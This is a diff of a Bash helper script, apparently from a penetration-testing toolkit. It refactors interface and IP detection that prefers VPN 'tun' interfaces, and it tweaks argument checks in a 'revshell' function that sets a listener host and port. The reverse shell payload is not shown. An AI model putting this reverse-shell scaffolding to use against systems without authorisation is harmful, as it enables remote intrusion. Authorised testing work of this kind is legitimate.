@@ -21,17 +21,20 @@ function prefer_order {
 # TODO: try to repace ugly things with is_empty
 function getmyip {
   iface=$1
-  if [ $( echo -n "$iface" | wc -l ) == 0 ]; then
-    allifaces=$(ip l | grep -E '^[[:digit:]]+: ' | cut -d ':' -f 2 | awk '{print $1}')
-    tunifaces=$(echo $allifaces | grep '^tun')
+  ifacestf=$(mktemp)
+
+  if [ -z "$iface" ]; then
+    ip l | grep -E '^[[:digit:]]+: ' | cut -d ':' -f 2 | awk '{print $1}' > $ifacestf
+    tunifaces=$(cat $ifacestf | grep '^tun')
     # if there's one single tun interface, grab it
     if [ $(echo "$tunifaces" | wc -l) == 1 ]; then
       export iface=$tunifaces
     fi
     # if we still can't find it, ask
-    if [ $( echo -n "$iface" | wc -c ) == 0 ]; then
-      export iface=$(echo $allifaces | fzf)
+    if [ -z "$iface" ]; then
+      export iface=$(cat $ifacestf | fzf)
     fi
+    rm $ifacestf
   fi
   ip a s $iface | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -n 1
 }
@@ -69,7 +72,7 @@ function downloadfiles {
 function revshell {
   lhost=$(getmyip)
   lport=$1
-  if is_empty "$lport"; then
+  if [ -z "$lport" ]; then
     echo LPORT is empty
     echo "Usage: $0 [LPORT]"
     export lport=1234
